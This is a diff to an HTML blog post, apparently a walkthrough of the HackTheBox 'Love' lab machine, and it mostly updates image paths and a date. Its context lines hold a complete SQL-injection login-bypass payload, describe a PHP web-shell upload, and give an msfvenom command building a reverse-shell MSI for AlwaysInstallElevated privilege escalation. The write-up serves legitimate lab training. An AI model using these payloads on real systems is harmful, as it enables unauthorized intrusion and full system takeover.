@@ -17,7 +17,7 @@
 			<span id="menu_button" class="menu_item">...</span>
 			<div id="menu">
 				<a href="/index.html" class="menu_item">Home</a>
-				<a href="/Blogs/TLDR/htb_love.html" class="menu_item">TLDR</a>
+				<a href="/Blogs/TLDR/HackTheBox/love.html" class="menu_item">TLDR</a>
 				<a href="/Blogs/index.html" class="menu_item">All Blogs</a>
 				<a href="/Blogs/resources.html" class="menu_item">Resources</a>
 			</div>
@@ -42,7 +42,7 @@
 			<p class="subtitle">Hacking the Login:</p>
 			<p class="content">Checking the gobuster results yeilds us the admin login page, which looks exactly like the voters login page. Using our PoC injection from before, we see that this page is also vulnerable. We can then read the newly discovered exploits how-to and use burpsuite to relay the info we need. Something I've found is that the "login" value should be empty. I also change the password to "passie" and replace the bcrypt string with the appropriate value. This is the full payload: </br><span class="code">password=passie&username=notadmin' UNION SELECT 1,2,"$2a$12$TkzTU9cx01SFg9efTzbkJea8QzdMebNJTVyPYEvOESXGFYLSr1xEO",4,5,6,7 from INFORMATION_SCHEMA.SCHEMATA;-- -&login=""</span>. Once we POST this payload to the login page we're greeted with the admin home page.</p>
 			<div class="image">
-				<img src="./Pics/votingsystem.png">
+				<img src="/Blogs/HackTheBox/Pics/Love_p/votingsystem.png">
 				<p class="imgsub">Admin page</p>
 			</div>
 		</div>
@@ -50,7 +50,7 @@
 			<p class="subtitle">Uploading Pictu- Files:</p>
 			<p class="content">As we look around the page we come across a tab: "Voters". Within this tab we're able to create a new voter, which we name "Hacker Mike". We can also upload a picture. Hmm..... Through our malicious ideologies, we try uploading a php file which doesn't throw any errors. By checking inspect elements we can see the directory these "pictures" are held is in "/images". We check and TADA! Our file is there!</p>
 			<div class="image">
-				<img src="./Pics/addingvoter.png">
+				<img src="/Blogs/HackTheBox/Pics/Love_p/addingvoter.png">
 				<p class="imgsub">Creating a new voter while uploading a PHP reverse shell</p>
 			</div>
 		</div>
@@ -58,7 +58,7 @@
 			<p class="subtitle">Getting User:</p>
 			<p class="content">We can directly access our file which brings us a web shell, with the GET key being "miked". Web shells are kinda crapy though. We can get a reverse shell going with a PowerShell one-liner <a href="#ref_2" class="link">[2]</a>. Once we have a better shell we can comfortably find the flag file at "C:\Users\Phoebe\Desktop\user.txt"</p>
 			<div class="image">
-				<img src="./Pics/user.png">
+				<img src="/Blogs/HackTheBox/Pics/Love_p/user.png">
 				<p class="imgsub">Location of user.txt file (No spoilers!)</p>
 			</div>
 		</div>
@@ -68,7 +68,7 @@
 			<p class="content">Looking through the report we find that both "AlwaysInstallElevated" registers are set to 1. This means we can "install" any .msi file as NT AUTHORITY/SYSTEM. We can generate a reverse shell using msfvenom: <span class="code">msfvenom -p windows/meterpreter/reverse_tcp -f msi lhost=&ltip&gt lport=3188 > hacked.msi</span>. As mich as I hate using meterpreter, I've not had luck using a generic shell.</p>
 			<p class="content">Once we establish the shell we can verify our godly status with <span class="code">whoami</span>, which returns an exciting "nt authority\system"! We can then find the root flag at "C"\Users\Administrator\Desktop\root.txt"! Bam! We've successfully owned the Love box!</p>
 			<div class="image">
-				<img src="./Pics/root.png">
+				<img src="/Blogs/HackTheBox/Pics/Love_p/root.png">
 				<p class="imgsub"><span class="code">whoami</span> plus location of root.txt (No spoilers!)</p>
 			</div>
 		</div>
@@ -88,7 +88,7 @@
 		<br>
 		<div class="paragraph">
 			<hr>
-			<p class="content">Date created: 2021.08.20</p>
+			<p class="content">Last Edit: 2021.08.20</p>
 		</div>
 	</div>
 </body>
